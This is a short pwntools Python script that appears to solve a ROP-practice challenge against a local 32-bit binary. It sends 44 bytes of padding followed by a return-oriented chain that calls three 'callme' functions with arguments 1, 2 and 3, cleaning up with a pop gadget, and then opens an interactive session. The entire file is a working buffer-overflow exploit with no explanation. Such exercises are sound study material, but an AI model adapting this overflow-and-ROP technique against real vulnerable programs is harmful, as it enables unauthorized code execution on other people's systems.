from pwn import *
context.log_level = 'debug'

p="./elf"

callmeone=0x080485C0
callmetwo=0x08048620
callmethree=0x080485B0
pop_para=0x080488a9

context.binary=p
io=process(p)

payload="A"*44+p32(callmeone)+p32(pop_para)+p32(1)+p32(2)+p32(3)
payload+=p32(callmetwo)+p32(pop_para)+p32(1)+p32(2)+p32(3)
payload+=p32(callmethree)+p32(0xdeadbeef)+p32(1)+p32(2)+p32(3)

io.sendline(payload)
io.interactive()
